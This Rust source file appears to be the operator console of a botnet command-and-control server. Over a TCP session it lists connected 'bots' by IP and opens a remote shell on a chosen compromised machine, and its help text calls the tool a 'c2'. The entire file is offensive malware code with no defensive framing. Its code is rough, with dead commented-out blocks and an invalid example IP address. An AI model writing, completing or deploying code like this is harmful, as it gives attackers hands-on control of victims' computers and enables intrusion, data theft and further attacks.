use std::{collections::HashMap, error::Error, net::IpAddr, sync::Arc, thread::sleep, time::Duration};

use tokio::{io::AsyncWriteExt, sync::RwLock};

use crate::{utils::terminal::{clear, default_prompt, prompt, reply}, Connection, ConnectionList, TcpStream};
use super::utils_controllers::shell::shell;



pub async fn machines_controller(mut socket : &mut TcpStream, bots_listening: ConnectionList ) -> Result<(), Box<dyn Error>> {
    
    
//please droooop it is vaible plmds
    // let bots_listening_connectds = bots_listening.read().await;


    // let bots_listening_clone = bots_listening_connectds
    // .iter()
    // .conn();

    let commands = create_hashmap_commands();

    clear(&mut socket).await;

    reply("use 'help' to see all comands", true, &mut socket).await;

    loop {


        let command_user = default_prompt(&mut socket).await?;

        match command_user.as_str().trim() {
            i if i.contains("help") => {

                let mut help_info: String = String::from("  commands");

                for (command, infos) in &commands {
                    if let Some(info) = infos.get("info") {
                        let data_comand = format!("\n        {command}   {info}");
                        help_info.push_str(&data_comand);
                    }
                }

                reply(&help_info, true, &mut socket).await;

            }


            i if i.contains("show") => {

                let bots_listening_connectds = bots_listening.read().await;
                for info_socket in bots_listening_connectds.iter() {
                    reply(info_socket.ip.to_string().as_str(), true, &mut socket).await;
                }

            },


            i if i.contains("shell") => {

                let ip_bot = i.trim().split_once("shell").unwrap().1.trim();
                let commands = create_hashmap_commands();

                
                let ip_target: IpAddr = match ip_bot.parse::<IpAddr>() {
                    Ok(ip) => ip,
                    Err(_e) => {
                        reply("is invalid ip.", true, &mut socket).await;
                        let use_commmand = get_info_commands("shell", "use", commands);
                        let format_use_command = format!("incorrect command, try '{use_commmand}'");
                        reply(&format_use_command.as_str(), true, &mut socket).await;
                        continue
                    }
                };

                let bots_connectds = bots_listening.read().await;
                for info_socket in bots_connectds.iter() {

                   
                    if info_socket.ip == ip_target {

                        reply("trying establish connection with machine ... ", true, &mut socket).await;
                        let try_connect_shell =  shell(&info_socket.stream, socket,ip_bot).await;
                        // match shell(&info_socket.stream, socket,ip_bot).await {
                        //     Ok(_) => {
                        //     },
                        //     Err(_) => {
                        //         reply("connectin with machine it is closeded.", true, &mut socket).await;
                        //         continue
                        //     }
                        // }
                    

                    continue
                }

                reply("ip is invalid.", true, &mut socket).await;

                }
            },


            i if i.contains("back") => break,

            comand_user => {
                let message = format!("'{}' not is a valid comand.", comand_user.trim());
                reply(&message.as_str(), true, &mut socket).await;
            }
        }

    }


    Ok(())

}


fn get_info_commands(
    command : &str,
     key:&str, 
     commands: HashMap<&'static str, HashMap<&'static str, &'static str>>
     ) -> &'static str {
    if let Some(info_shell) = commands.get(command) {

        if let Some(info) = info_shell.get(key) {
            return info;
        };
    
    }; 
    ""
}

fn create_hashmap_commands() -> HashMap<&'static str, HashMap<&'static str, &'static str>> {
    let mut commands = HashMap::new();

    let mut help = HashMap::new();
    help.insert("info", "help, view all commands in c2");
    help.insert("use", "help");

    let mut shell_command = HashMap::new();
    shell_command.insert("info", "get a shell of machine");
    shell_command.insert("use", "shell 181.23.321.21");

    let mut show_command = HashMap::new();
    show_command.insert("info", "view all machines connected in c2");
    show_command.insert("use", "show");

    let mut search_command = HashMap::new();
    search_command.insert("info", "search for machines connected");
    search_command.insert("use", "info show");

    let mut back_command = HashMap::new();
    back_command.insert("info", "back to last menu");
    back_command.insert("use", "back");

    commands.insert("back", back_command);
    commands.insert("shell", shell_command);
    commands.insert("search", search_command);
    commands.insert("show", show_command);
    commands.insert("help", help);

    commands
}